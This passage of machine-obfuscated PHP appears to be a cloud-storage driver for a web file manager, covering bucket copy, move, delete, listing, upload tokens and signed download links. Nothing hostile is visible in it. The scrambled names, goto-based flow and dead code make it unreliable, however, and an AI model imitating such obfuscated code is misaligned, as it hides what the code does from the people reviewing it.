$ioFileOutServer = "\60"; public function __construct($DËèğòšÚ«) { parent::__construct(); require_once SDK_DIR . $_SERVER[í¤âËÚ£¶íÊ¢][1261]; $this->_init($DËèğòšÚ«); } public function _init($A¡Ï»à•Éö) { goto f®è‹’Ò˜´; Cø„‰Ã’Ù”: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto a‡”ø‹Á”ƒ; f®è‹’Ò˜´: $Fâõ“âï§ =& $_SERVER[í¤âËÚ£¶íÊ¢]; foreach ($A¡Ï»à•Éö as $A¥ÙÔò¤³ => $AÒùõ¯ª«) { if (isset($this->{$A¥ÙÔò¤³})) { $this->{$A¥ÙÔò¤³} = $AÒùõ¯ª«; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Fâõ“âï§[1262] . LNG($Fâõ“âï§[1221])); } goto dïç‡¡¸”‹; dïç‡¡¸”‹: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto Cø„‰Ã’Ù”; a‡”ø‹Á”ƒ: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($FÈ‹Ø¡, $D¨Ğôòêç© = '', $cêˆÒ°µ†Ş = REPEAT_RENAME) { if ($this->setContent($FÈ‹Ø¡, $D¨Ğôòêç©)) { return $this->getPathOuter($FÈ‹Ø¡); } return !1; } public function mkdir($Cí¨½·¬Œ, $D·èîÔƒâÄ = REPEAT_SKIP) { goto E ñéİˆÕ¨; E ñéİˆÕ¨: $CˆïˆÏË¿İ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $F¾Äò÷­Ê = trim($Cí¨½·¬Œ, $CˆïˆÏË¿İ[8]); if ($this->_isFolder($F¾Äò÷­Ê)) { return $this->getPathOuter($F¾Äò÷­Ê); } goto bŠƒïåî”¿; bŠƒïåî”¿: $Cí¨½·¬Œ = $F¾Äò÷­Ê . $CˆïˆÏË¿İ[8]; $Fª®µÂà»ò = get_path_this($F¾Äò÷­Ê); $aßÍŠï–ˆ = $Cí¨½·¬Œ . $Fª®µÂà»ò; goto Fö•“‰ŒÚ•; Fö•“‰ŒÚ•: if (!$this->mkfile($aßÍŠï–ˆ)) { return !1; } if (!$this->moveFile($aßÍŠï–ˆ, $Cí¨½·¬Œ)) { $this->delFile($aßÍŠï–ˆ); return !1; } return $this->getPathOuter($F¾Äò÷­Ê); goto CØãÙ®½Š; CØãÙ®½Š: } public function copyFile($A…«‚‡ˆ”í, $bÜ×ğÖóØ) { $B¨ìÌ§™ = $this->bucketManager->copy($this->bucket, $A…«‚‡ˆ”í, $this->bucket, $bÜ×ğÖóØ, !0); return $B¨ìÌ§™ ? !1 : $this->getPathOuter($bÜ×ğÖóØ); } public function moveFile($aËœ¸âŞÑÕ, $AÛøí­æ‡†) { $cÉÙ¼ÊªÅø = $this->bucketManager->move($this->bucket, $aËœ¸âŞÑÕ, $this->bucket, $AÛøí­æ‡†, !0); return $cÉÙ¼ÊªÅø ? !1 : $this->getPathOuter($AÛøí­æ‡†); } public function delFile($F¾é©êà‰») { if (!$this->exist($F¾é©êà‰»)) { return !0; } $Fğ‚ÏËÚ¦¶ = $this->bucketManager->delete($this->bucket, $F¾é©êà‰»); return $Fğ‚ÏËÚ¦¶ ? !1 : !0; } public function delFolder($c„à»‚Œ) { goto a•Õ¶”ˆé»; a¼¢ùÍÎÄØ: $DÈŒÒëÕ¦ = $this->fileList($c„à»‚Œ); $this->listItemCache = !0; $Aö’¥‘¨õ = trim($c„à»‚Œ, $Aˆ…­¹ùœğ[8]) . $Aˆ…­¹ùœğ[8]; goto bÀ×„ğˆ; bÀ×„ğˆ: if (!empty($c„à»‚Œ) && !in_array($Aö’¥‘¨õ, $DÈŒÒëÕ¦[$Aˆ…­¹ùœğ[84]])) { $DÈŒÒëÕ¦[$Aˆ…­¹ùœğ[84]][] = $Aö’¥‘¨õ; } $a®Ê¹Û¤«Ô = $this->delByBatch($DÈŒÒëÕ¦[$Aˆ…­¹ùœğ[83]]); if (!$a®Ê¹Û¤«Ô) { return !1; } goto bÕ¢Šßõ÷; a•Õ¶”ˆé»: $Aˆ…­¹ùœğ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$this->exist($c„à»‚Œ)) { return !0; } $this->listItemCache = !1; goto a¼¢ùÍÎÄØ; bÕ¢Šßõ÷: return $this->delByBatch($DÈŒÒëÕ¦[$Aˆ…­¹ùœğ[84]]); goto f¦Ò…‡Ú›ö; f¦Ò…‡Ú›ö: } private function delByBatch($BŸÛ¶Ìì˜Ù) { foreach (array_chunk($BŸÛ¶Ìì˜Ù, 1000) as $a”ƒ‡™’²¼) { $aÔ…ê³êŠ² = $this->bucketManager->buildBatchDelete($this->bucket, $a”ƒ‡™’²¼); list($A†¿˜øá¥Ô, $A¬¹©Ö‡Ãà) = $this->bucketManager->batch($aÔ…ê³êŠ²); if ($A¬¹©Ö‡Ãà) { return !1; } } return !0; } public function rename($d›™¹ŞôÛñ, $dßÃÅÒç‰†) { return $this->renameObject($d›™¹ŞôÛñ, $dßÃÅÒç‰†); } public function fileInfo($Eéç§½…¤‹, $d‚×µ»£Ì¸ = false, $aÄÍŸŒù¼¯ = array()) { goto a’¸Ä°¢ˆ; f¡¥ÇùíÑ: $dµ¡öÓÈ²«[$bòà÷õòÒï[202]] = $dµ¡öÓÈ²«[$bòà÷õòÒï[93]] = 0; $dµ¡öÓÈ²«[$bòà÷õòÒï[203]] = $dµ¡öÓÈ²«[$bòà÷õòÒï[204]] = !0; if (empty($aÄÍŸŒù¼¯)) { $aÄÍŸŒù¼¯ = $this->objectMeta($Eéç§½…¤‹); if (!$aÄÍŸŒù¼¯) { return $dµ¡öÓÈ²«; } } goto cò”“êö; a’¸Ä°¢ˆ: $bòà÷õòÒï =& $_SERVER[í¤âËÚ£¶íÊ¢]; $dµ¡öÓÈ²« = array($bòà÷õòÒï[28] => $this->pathThis($Eéç§½…¤‹), $bòà÷õòÒï[85] => $this->getPathOuter($bòà÷õòÒï[8] . $Eéç§½…¤‹), $bòà÷õòÒï[29] => $bòà÷õòÒï[201], $bòà÷õòÒï[87] => isset($aÄÍŸŒù¼¯[$bòà÷õòÒï[1263]]) ? $aÄÍŸŒù¼¯[$bòà÷õòÒï[1263]] : 0, $bòà÷õòÒï[177] => $this->ext($Eéç§½…¤‹)); if ($d‚×µ»£Ì¸) { return $dµ¡öÓÈ²«; } goto f¡¥ÇùíÑ; cò”“êö: if (isset($aÄÍŸŒù¼¯[$bòà÷õòÒï[1264]])) { $dµ¡öÓÈ²«[$bòà÷õòÒï[93]] = substr($aÄÍŸŒù¼¯[$bòà÷õòÒï[1264]] . $bòà÷õòÒï[33], 0, 10); } if (isset($aÄÍŸŒù¼¯[$bòà÷õòÒï[1263]])) { $dµ¡öÓÈ²«[$bòà÷õòÒï[87]] = $aÄÍŸŒù¼¯[$bòà÷õòÒï[1263]]; } return $dµ¡öÓÈ²«; goto aÃ¼‘àíÅß; aÃ¼‘àíÅß: } public function folderInfo($cÎĞÇŠ“î, $BíóİËØÜ = false) { goto aµŒ·¦¯æ; cÁ„ª„›Û¼: $CÊÙ‚¿Î§²[$C’éˆâÉ³ß[202]] = $CÊÙ‚¿Î§²[$C’éˆâÉ³ß[93]] = 0; $CÊÙ‚¿Î§²[$C’éˆâÉ³ß[203]] = $CÊÙ‚¿Î§²[$C’éˆâÉ³ß[204]] = !0; $cÎĞÇŠ“î = rtrim($cÎĞÇŠ“î, $C’éˆâÉ³ß[8]) . $C’éˆâÉ³ß[8]; goto EÈÎ„µÊ; EÈÎ„µÊ: $CëŞ¾ñ‚º¡ = $this->objectMeta($cÎĞÇŠ“î); if (isset($CëŞ¾ñ‚º¡[$C’éˆâÉ³ß[1264]])) { $CÊÙ‚¿Î§²[$C’éˆâÉ³ß[93]] = substr($CëŞ¾ñ‚º¡[$C’éˆâÉ³ß[1264]] . $C’éˆâÉ³ß[33], 0, 10); } return $CÊÙ‚¿Î§²; goto B¬ºĞÈËˆ; aµŒ·¦¯æ: $C’éˆâÉ³ß =& $_SERVER[í¤âËÚ£¶íÊ¢]; $CÊÙ‚¿Î§² = array($C’éˆâÉ³ß[28] => $this->pathThis($cÎĞÇŠ“î), $C’éˆâÉ³ß[85] => $this->getPathOuter($C’éˆâÉ³ß[8] . $cÎĞÇŠ“î), $C’éˆâÉ³ß[29] => $C’éˆâÉ³ß[86]); if ($BíóİËØÜ) { return $CÊÙ‚¿Î§²; } goto cÁ„ª„›Û¼; B¬ºĞÈËˆ: } public function listPath($bğÖ¬Æ“—, $D•‰“‚§º = false) { $f”ëÉæ¥ƒ° =& $_SERVER[í¤âËÚ£¶íÊ¢]; $F˜§åƒ‹†è = $this->fileList($bğÖ¬Æ“—, $f”ëÉæ¥ƒ°[8], !0); foreach ($F˜§åƒ‹†è[$f”ëÉæ¥ƒ°[84]] as $c«÷ÉŠìµ => $BÚŠÎöòºÈ) { $F˜§åƒ‹†è[$f”ëÉæ¥ƒ°[84]][$c«÷ÉŠìµ] = $this->folderInfo($BÚŠÎöòºÈ, $D•‰“‚§º); } foreach ($F˜§åƒ‹†è[$f”ëÉæ¥ƒ°[83]] as $c«÷ÉŠìµ => $BÚŠÎöòºÈ) { $F˜§åƒ‹†è[$f”ëÉæ¥ƒ°[83]][$c«÷ÉŠìµ] = $this->fileInfo($BÚŠÎöòºÈ[$f”ëÉæ¥ƒ°[102]], $D•‰“‚§º, $BÚŠÎöòºÈ); } return $F˜§åƒ‹†è; } public function has($eÁ†´ßïÍ, $dÄ™ĞËÍè = false, $d‡»óó§—» = true) { goto bùÈš‘¨Ù˜; bùÈš‘¨Ù˜: $C»’æÍ–ÏĞ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eÁ†´ßïÍ = trim($eÁ†´ßïÍ, $C»’æÍ–ÏĞ[8]); $d÷ªÕŞÅ‰— = empty($eÁ†´ßïÍ) ? $C»’æÍ–ÏĞ[33] : $eÁ†´ßïÍ . $C»’æÍ–ÏĞ[8]; goto cšÑ¸æôö”; cšÑ¸æôö”: $fĞà»í£àÉ = $C»’æÍ–ÏĞ[33]; $BÇáÃÚ’à = 500; $Ağãå÷ÑîĞ = $C»’æÍ–ÏĞ[8]; goto b´îÎÅ”ŒÂ; b´îÎÅ”ŒÂ: $DöÔï˜øø‹ = $FÏ˜­ŠŞ˜  = 0; while (!0) { check_abort(); list($E•ö£¬ÁÀ, $dº­ŸçÚò±) = $this->bucketManager->listFiles($this->bucket, $d÷ªÕŞÅ‰—, $fĞà»í£àÉ, $BÇáÃÚ’à, $Ağãå÷ÑîĞ); if ($dº­ŸçÚò±) { break; } $fĞà»í£àÉ = array_key_exists($C»’æÍ–ÏĞ[1233], $E•ö£¬ÁÀ) ? $fĞà»í£àÉ = $E•ö£¬ÁÀ[$C»’æÍ–ÏĞ[1265]] : $C»’æÍ–ÏĞ[33]; if ($dÄ™ĞËÍè) { if (!empty($E•ö£¬ÁÀ[$C»’æÍ–ÏĞ[1266]])) { $DöÔï˜øø‹ += count($E•ö£¬ÁÀ[$C»’æÍ–ÏĞ[1266]]); } if (!empty($E•ö£¬ÁÀ[$C»’æÍ–ÏĞ[1267]])) { $FÏ˜­ŠŞ˜  += count($E•ö£¬ÁÀ[$C»’æÍ–ÏĞ[1267]]); } if ($fĞà»í£àÉ === $C»’æÍ–ÏĞ[33]) { break; } continue; } if ($d‡»óó§—») { if (!empty($E•ö£¬ÁÀ[$C»’æÍ–ÏĞ[1266]])) { return !0; } } else { if (!empty($E•ö£¬ÁÀ[$C»’æÍ–ÏĞ[1267]])) { return !0; } } if ($fĞà»í£àÉ === $C»’æÍ–ÏĞ[33]) { break; } } if ($dÄ™ĞËÍè) { return array($C»’æÍ–ÏĞ[211] => $DöÔï˜øø‹, $C»’æÍ–ÏĞ[212] => $FÏ˜­ŠŞ˜ ); } goto aÂª¼î‘µÓ; aÂª¼î‘µÓ: return !1; goto FÅİÒãÂ; FÅİÒãÂ: } public function listAll($DÛ·Éà¥ƒ) { $eå±×å…‚„ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $e¯ôÓ£ÇÀ« = $this->fileList($DÛ·Éà¥ƒ, $eå±×å…‚„[33], !0); $c˜Êœ›ñ‡ = array(); foreach ($e¯ôÓ£ÇÀ«[$eå±×å…‚„[83]] as $d¨¼‚¨®¡) { $c˜Êœ›ñ‡[$d¨¼‚¨®¡[$eå±×å…‚„[102]]] = $d¨¼‚¨®¡[$eå±×å…‚„[87]]; } foreach ($e¯ôÓ£ÇÀ«[$eå±×å…‚„[84]] as $d¨¼‚¨®¡) { if (is_string($d¨¼‚¨®¡)) { $c˜Êœ›ñ‡[$d¨¼‚¨®¡] = 0; } } return $this->listAllFiles($DÛ·Éà¥ƒ, array_keys($c˜Êœ›ñ‡), $c˜Êœ›ñ‡); } private function fileList($fš¡·¸÷, $E¾ÄÜ­Çª§ = '', $FóÛ†Ïé† = 0) { goto EÍ ¯Å’¦ˆ; EÍ ¯Å’¦ˆ: $e¥¨§È¹ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $fš¡·¸÷ = trim($fš¡·¸÷, $e¥¨§È¹[8]); $dŠ‚ôîâá = empty($fš¡·¸÷) ? $e¥¨§È¹[33] : $fš¡·¸÷ . $e¥¨§È¹[8]; goto AÒËôä´°ï; AÒËôä´°ï: $Bçñ«ä¼¤† = $e¥¨§È¹[33]; $d«íˆÜ½Îë = 1000; $eíŠášÍ = $this->listItemCache === !1 ? !1 : !0; goto F±Å¶“½»; F±Å¶“½»: $Bæá§İ¥ƒ = $bÛŞøŸé‹³ = array(); while (!0) { check_abort(); list($A†ÌçøŒÈº, $DÚŠ—·¼ò¨) = $this->bucketManager->listFiles($this->bucket, $dŠ‚ôîâá, $Bçñ«ä¼¤†, $d«íˆÜ½Îë, $E¾ÄÜ­Çª§); if ($DÚŠ—·¼ò¨) { break; } $Bçñ«ä¼¤† = array_key_exists($e¥¨§È¹[1233], $A†ÌçøŒÈº) ? $Bçñ«ä¼¤† = $A†ÌçøŒÈº[$e¥¨§È¹[1265]] : $e¥¨§È¹[33]; $EöÃºšİ¬ = isset($A†ÌçøŒÈº[$e¥¨§È¹[1266]]) ? $A†ÌçøŒÈº[$e¥¨§È¹[1266]] : array(); $cŸ´óáğ«  = isset($A†ÌçøŒÈº[$e¥¨§È¹[1267]]) ? $A†ÌçøŒÈº[$e¥¨§È¹[1267]] : array(); foreach ($EöÃºšİ¬ as $fÎâÂİº•†) { goto aĞä¸¤”µ; dã˜ïù´—½: $fÎâÂİº•†[$e¥¨§È¹[87]] = $a¸¤‡Ë…; $e±Å§Ì‹ = $a¸¤‡Ë… == 0 && substr($C”´ºÜ¦¹‹, strlen($C”´ºÜ¦¹‹) - 1, 1) == $e¥¨§È¹[8] ? !0 : !1; if ($eíŠášÍ) { $this->cacheMethod($e¥¨§È¹[207], $C”´ºÜ¦¹‹, $e±Å§Ì‹); $this->cacheMethod($e¥¨§È¹[208], $C”´ºÜ¦¹‹, $fÎâÂİº•†); } goto C“Ğœ£Åµ; aĞä¸¤”µ: if ($fÎâÂİº•†[$e¥¨§È¹[102]] == $dŠ‚ôîâá) { continue; } $C”´ºÜ¦¹‹ = $fÎâÂİº•†[$e¥¨§È¹[102]]; $a¸¤‡Ë… = $fÎâÂİº•†[$e¥¨§È¹[1263]]; goto dã˜ïù´—½; C“Ğœ£Åµ: if ($e±Å§Ì‹) { $Bæá§İ¥ƒ[] = $C”´ºÜ¦¹‹; continue; } $bÛŞøŸé‹³[] = $FóÛ†Ïé† ? $fÎâÂİº•† : $C”´ºÜ¦¹‹; goto cï°Ò£ëŞ; cï°Ò£ëŞ: } foreach ($cŸ´óáğ«  as $C”´ºÜ¦¹‹) { if ($C”´ºÜ¦¹‹ == $dŠ‚ôîâá) { continue; } $Bæá§İ¥ƒ[] = $C”´ºÜ¦¹‹; if ($eíŠášÍ) { $this->cacheMethod($e¥¨§È¹[207], $C”´ºÜ¦¹‹, !0); } } if ($Bçñ«ä¼¤† === $e¥¨§È¹[33]) { break; } } if ($eíŠášÍ) { $this->cacheMethod($e¥¨§È¹[207], $fš¡·¸÷, !0); } goto eøŞ×…ÚÄä; eøŞ×…ÚÄä: return array($e¥¨§È¹[84] => $Bæá§İ¥ƒ, $e¥¨§È¹[83] => $bÛŞøŸé‹³); goto Fµ§¯¥»‘‡; Fµ§¯¥»‘‡: } public function canRead($DŒÊò´éÈ) { return $this->exist($DŒÊò´éÈ) ? !0 : !1; } public function canWrite($CŒø»Ï¿ĞÄ) { return $this->exist($CŒø»Ï¿ĞÄ) ? !0 : !1; } public function getContent($béñĞµÕÚº) { return $this->fileSubstr($béñĞµÕÚº, 0, -1); } public function setContent($dí…é¥Á, $eå´õšù‚ = '') { $c˜é±ğôŒë = $this->tempFile($this->pathThis($dí…é¥Á)); file_put_contents($c˜é±ğôŒë, $eå´õšù‚); if ($this->upload($dí…é¥Á, $c˜é±ğôŒë)) { $this->tempFileRemve($c˜é±ğôŒë); return !0; } return !1; } public function refreshUrls($Aªâµ¡ó¨) { goto E²õÛ•œÆ²; E²õÛ•œÆ²: $Añš¶ö×éã =& $_SERVER[í¤âËÚ£¶íÊ¢]; $dÏªõÀ‚‘ = array(); if (is_array($Aªâµ¡ó¨)) { foreach ($Aªâµ¡ó¨ as $a´­š—¬†Î) { $dÏªõÀ‚‘[] = $this->link($a´­š—¬†Î); } } else { $dÏªõÀ‚‘[] = $this->link($Aªâµ¡ó¨); } goto E¿ã‘ïª³; bÂ‘Íİ¸: return $cùƒêøé[$Añš¶ö×éã[1038]] == $Añš¶ö×éã[701] ? !0 : !1; goto EòÆº²ì; E¿ã‘ïª³: $f´ñŸåØØã = new Qiniu\Cdn\CdnManager($this->auth); list($cùƒêøé, $A°‚†ì‰) = $f´ñŸåØØã->refreshUrls($dÏªõÀ‚‘); if ($A°‚†ì‰) { return !1; } goto bÂ‘Íİ¸; EòÆº²ì: } public function fileSubstr($c¯‚õ—Áˆ, $A„î¿åƒ†, $B÷Ê‹ë’©˜) { $c’ƒ‹˜çß =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!($Eæ£¤ÀæÛ = $this->link($c¯‚õ—Áˆ))) { return !1; } $bÕ¾ÖŸ›Ñ = !1; if ($B÷Ê‹ë’©˜ > 0) { $a­Ì£·¬ŠÀ = $A„î¿åƒ† + $B÷Ê‹ë’©˜ - 1; $bÕ¾ÖŸ›Ñ = array($c’ƒ‹˜çß[1268] . $A„î¿åƒ† . $c’ƒ‹˜çß[443] . $a­Ì£·¬ŠÀ); } $Eèî‘á„Šˆ = url_request($Eæ£¤ÀæÛ, $c’ƒ‹˜çß[236], !1, $bÕ¾ÖŸ›Ñ); return $Eèî‘á„Šˆ[$c’ƒ‹˜çß[694]] ? $Eèî‘á„Šˆ[$c’ƒ‹˜çß[1048]] : !1; } public function upload($eíŒâ©‰¥, $eæÇºìØ‘À, $cØ ê§‡ñé = false, $C“®Åæ³ƒ¾ = REPEAT_REPLACE) { $C·§¦®Ù· = new Qiniu\Storage\UploadManager(); $DñÎªïô½Æ = $this->auth->uploadToken($this->bucket, $eíŒâ©‰¥); $e˜ª•À£öğ = get_file_mime(get_path_ext($eæÇºìØ‘À)); list($d¤à…‘½çö, $d–¥Ô»öâö) = $C·§¦®Ù·->putFile($DñÎªïô½Æ, $eíŒâ©‰¥, $eæÇºìØ‘À, null, $e˜ª•À£öğ); return $d–¥Ô»öâö ? !1 : $this->getPathOuter($eíŒâ©‰¥); } public function uploadFormData($aÊŞ­ß–™¹, $e ­çÈñ£¾ = 3600) { return $this->uploadToken($aÊŞ­ß–™¹, $e ­çÈñ£¾); } public function multiUploadFormData($f‚±ßñ•Ë, $AÕÛâ‹¥  = 3600) { return $this->uploadToken($f‚±ßñ•Ë, $AÕÛâ‹¥ ); } private function uploadToken($A¥ ™¹Ïñƒ, $DšèÁæØë = 3600) { goto Aë¶ œ”È¬; c©µßÁ‰°­: $céÆˆªÂÚì = http_type() . "\x3a\x2f\x2f\165\x70\x6c\157\x61\x64{$cŠšèäùÓ±}\56\161\151\156\x69\x75\x70\x2e\143\x6f\155\x2f"; return array($e¬ßùìƒ¿[1272] => $e¹¦ë¦É±È, $e¬ßùìƒ¿[1273] => $céÆˆªÂÚì); goto AÑÖŠåÜÇÔ; e™ôÇî£µ: $fâĞí¯¡›£ = $A¥ ™¹Ïñƒ; $e¹¦ë¦É±È = $this->auth->uploadToken($this->bucket, $fâĞí¯¡›£, $dßšÇ§Ğ‡ó, $cõ½ñ†…é™, !0); $cŠšèäùÓ± = empty($this->region) || $this->region == $e¬ßùìƒ¿[1271] ? $e¬ßùìƒ¿[33] : $e¬ßùìƒ¿[443] . $this->region; goto c©µßÁ‰°­; Aë¶ œ”È¬: $e¬ßùìƒ¿ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $dßšÇ§Ğ‡ó = $DšèÁæØë; $cõ½ñ†…é™ = array($e¬ßùìƒ¿[1269] => $e¬ßùìƒ¿[1270]); goto e™ôÇî£µ; AÑÖŠåÜÇÔ: } public function download($B¨†Šì·‹Ä, $A®½¦âºÜõ) { goto BïßÒ™É£•; F†ŒÏ”ÒÇÆ: $BÀ½çÁŒÇñ = 1024 * 200; $D„×åÔ˜”ä = fopen($E¡ÌŞ–Êšá, $_SERVER[í¤âËÚ£¶íÊ¢][1274]); while (!0) { $e“ĞŠ­† © = $this->fileSubstr($B¨†Šì·‹Ä, $Bµ‚ôº‹Àé, $BÀ½çÁŒÇñ); if ($e“ĞŠ­† © === !1) { return !1; } fwrite($D„×åÔ˜”ä, $e“ĞŠ­† ©); $Bµ‚ôº‹Àé += $BÀ½çÁŒÇñ; if (strlen($e“ĞŠ­† ©) < $BÀ½çÁŒÇñ) { break; } } goto E†·Û±Ÿ¸; BïßÒ™É£•: $E¡ÌŞ–Êšá = IO::getPathInner(IO::mkfile($A®½¦âºÜõ)); if (!($BÜï´‹¦ñ‹ = $this->link($B¨†Šì·‹Ä))) { return !1; } $Bµ‚ôº‹Àé = 0; goto F†ŒÏ”ÒÇÆ; E†·Û±Ÿ¸: fclose($D„×åÔ˜”ä); return $A®½¦âºÜõ; goto C´´ƒÇÀ×Œ; C´´ƒÇÀ×Œ: } public function link($DóŸÍ‰„‹, $b‰¯É•ˆ = '') { if (!$this->isFile($DóŸÍ‰„‹)) { return !1; } $d˜»±¦¶¯£ = $this->getHost() . $_SERVER[í¤âËÚ£¶íÊ¢][8] . $this->pathEncode($DóŸÍ‰„‹) . $b‰¯É•ˆ; return $this->auth->privateDownloadUrl($d˜»±¦¶¯£, 3600 * 12); } public function fileOut($DÄÆ´‡éÉ–, $EÊÖ¾¨ÔÅ = false, $EÌä½ºå²§ = false, $E»Ş­ìá» = '') { $dôÕ“³ŠÎ· =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($this->isFileOutServer()) { return $this->fileOutServer($DÄÆ´‡éÉ–, $EÊÖ¾¨ÔÅ, $EÌä½ºå²§, $E»Ş­ìá»); } if (!$EÌä½ºå²§) { $EÌä½ºå²§ = $this->pathThis($DÄÆ´‡éÉ–); } $añØê–‰Ï„ = $EÊÖ¾¨ÔÅ ? $dôÕ“³ŠÎ·[1275] . rawurlencode($EÌä½ºå²§) : $dôÕ“³ŠÎ·[33]; $D¶©íÍƒ = $this->link($DÄÆ´‡éÉ–, $añØê–‰Ï„); $this->fileOutLink($D¶©íÍƒ); } public function fileOutServer($FÁÕº‰Ù·, $a©ã¤ÚÙ„† = false, $A…•‚‘çŠ = false, $c‰–ŒôÉ = '') { parent::fileOut($FÁÕº‰Ù·, $a©ã¤ÚÙ„†, $A…•‚‘çŠ, $c‰–ŒôÉ); } public function fileOutImage($AåÏßâÀÜ, $FïÓ°Öêå¯ = 250) { $FèÆÑ§Œ‚ = $this->link($AåÏßâÀÜ, $_SERVER[í¤âËÚ£¶íÊ¢][1276] . $FïÓ°Öêå¯); $this->fileOutLink($FèÆÑ§Œ‚); } public function fileOutImageServer($F˜ƒ©‰ñî», $AØ³¦Š¦Ë© = 250) { parent::fileOutImage($F˜ƒ©‰ñî», $AØ³¦Š¦Ë©); } public function hashMd5($DŒ‹Ñå‰Ñ) { $E¯¾íè÷Ÿ“ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $bù„å¶Â‹° = $this->objectMeta($DŒ‹Ñå‰Ñ); return isset($bù„å¶Â‹°[$E¯¾íè÷Ÿ“[216]]) ? $bù„å¶Â‹°[$E¯¾íè÷Ÿ“[216]] : !1; $b‚½¨¸ùƒ = $this->link($DŒ‹Ñå‰Ñ, $E¯¾íè÷Ÿ“[1277]); } public function size($E‰À«åÇ´¶) { $fÛ¿åµïª— = $this->objectMeta($E‰À«åÇ´¶); return $fÛ¿åµïª— ? $fÛ¿åµïª—[$_SERVER[í¤âËÚ£¶íÊ¢][87]] : 0; } public function info($CŸÚ‡øÉ½á) { if ($this->isFolder($CŸÚ‡øÉ½á)) { return $this->folderInfo($CŸÚ‡øÉ½á); } else { if ($this->isFile($CŸÚ‡øÉ½á)) { return $this->fileInfo($CŸÚ‡øÉ½á); } } return !1; } public function exist($dšÊŠ–˜Šñ) { return $this->isFile($dšÊŠ–˜Šñ) || $this->isFolder($dšÊŠ–˜Šñ); } public function isFile($Eé‡óŒĞˆ) { return !$this->isFolder($Eé‡óŒĞˆ) && $this->objectMeta($Eé‡óŒĞˆ); } public function isFolder($bÛ‹…ó¥Íµ) { return $this->cacheMethod($_SERVER[í¤âËÚ£¶íÊ¢][207], $bÛ‹…ó¥Íµ); } protected function objectMeta($d…’éáÓŒ‹) { return $this->cacheMethod($_SERVER[í¤âËÚ£¶íÊ¢][208], $d…’éáÓŒ‹); } protected function _objectMeta($eĞŠîôÃ®ö) { $bìñÂÛ¸½° =& $_SERVER[í¤âËÚ£¶íÊ¢]; list($EÀâ„½Î÷…, $AáèäĞÙÇ) = $this->bucketManager->stat($this->bucket, $eĞŠîôÃ®ö); if ($EÀâ„½Î÷…) { $EÀâ„½Î÷…[$bìñÂÛ¸½°[87]] = intval($EÀâ„½Î÷…[$bìñÂÛ¸½°[1263]]); } return $EÀâ„½Î÷…; } protected function _isFolder($däÜàŒí’ä) { $CáËÅñ³ Š =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($däÜàŒí’ä == $CáËÅñ³ Š[33] || $däÜàŒí’ä == $CáËÅñ³ Š[8]) { return !0; } list($fÚè’ÜÓ¹, $aäøæïÔ¾”) = $this->bucketManager->listFiles($this->bucket, trim($däÜàŒí’ä, $CáËÅñ³ Š[8]) . $CáËÅñ³ Š[8], $CáËÅñ³ Š[33], 1, $CáËÅñ³ Š[8]); return !empty($fÚè’ÜÓ¹[$CáËÅñ³ Š[1266]]) || !empty($fÚè’ÜÓ¹[$CáËÅñ³ Š[1267]]) ? !0 : !1; } } goto aåÒ¦‹ïá‡; CóŒÀƒÖÙÀ: class PathDriverDriverShareItem { public function __construct($eÑ»½è‹¨Ó) { $this->pathParse = $eÑ»½è‹¨Ó; } public function __call($cŠÎäÒŒÀ™, $e¬ÃÕòˆƒó) { $f‰Ìô³Æ¶ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (method_exists($this, $cŠÎäÒŒÀ™)) { return; } $AÇÎ•óíéƒ = call_user_func_array(array($f‰Ìô³Æ¶[1174], $cŠÎäÒŒÀ™), $e¬ÃÕòˆƒó); $F±ÄšÒÖ¶ = array($f‰Ìô³Æ¶[1175], $f‰Ìô³Æ¶[1176], $f‰Ìô³Æ¶[1177], $f‰Ìô³Æ¶[1178], $f‰Ìô³Æ¶[522], $f‰Ìô³Æ¶[524], $f‰Ìô³Æ¶[1179], $f‰Ìô³Æ¶[116], $f‰Ìô³Æ¶[1180], $f‰Ìô³Æ¶[1181]); if (in_array($cŠÎäÒŒÀ™, $F±ÄšÒÖ¶)) { $AÇÎ•óíéƒ = $this->getPathOuter($AÇÎ•óíéƒ); } return $AÇÎ•óíéƒ; } public function copy($c•³Ğæ‡…©, $aÈİÂã‘ÜÒ, $CÒöÍÁÓ’— = false) { return $this->copyMove($c•³Ğæ‡…©, $aÈİÂã‘ÜÒ, $CÒöÍÁÓ’—, $_SERVER[í¤âËÚ£¶íÊ¢][522]); } public function move($f†ŒÊà´ßö, $CŠÖÅÙ§êÏ, $c†µÓ£—‘• = false) { return $this->copyMove($f†ŒÊà´ßö, $CŠÖÅÙ§êÏ, $c†µÓ£—‘•, $_SERVER[í¤âËÚ£¶íÊ¢][524]); } private function copyMove($F³”¿Ê‰Øì, $E¬µì®Ä„Â, $e‡ŠÄ¤Êî, $DùÁœ„¤) { goto DäÌªã×’; b •ƒŒ£Û: return $Dœ‚ˆĞ†·³; goto FğéâÌæ¼; c××ÁëÓ¤: if ($D Ô«Ó™Ñ¯->pathParse[$AöâëÄ‚¦é[1008]]) { $E¬µì®Ä„Â = $D Ô«Ó™Ñ¯->pathParse[$AöâëÄ‚¦é[1008]]; } else { $E¬µì®Ä„Â = $e±ˆŠ£•ŞÏ; } $Dœ‚ˆĞ†·³ = IO::copyMove($F³”¿Ê‰Øì, $E¬µì®Ä„Â, $e‡ŠÄ¤Êî, $DùÁœ„¤); $Dœ‚ˆĞ†·³ = $this->getPathOuter($Dœ‚ˆĞ†·³); goto b •ƒŒ£Û; DäÌªã×’: $AöâëÄ‚¦é =& $_SERVER[í¤âËÚ£¶íÊ¢]; $e±ˆŠ£•ŞÏ = $E¬µì®Ä„Â; $D Ô«Ó™Ñ¯ = IO::driverMake($E¬µì®Ä„Â); goto c××ÁëÓ¤; FğéâÌæ¼: } public function pathThis($a¿Á¤ÁÄŒë) { 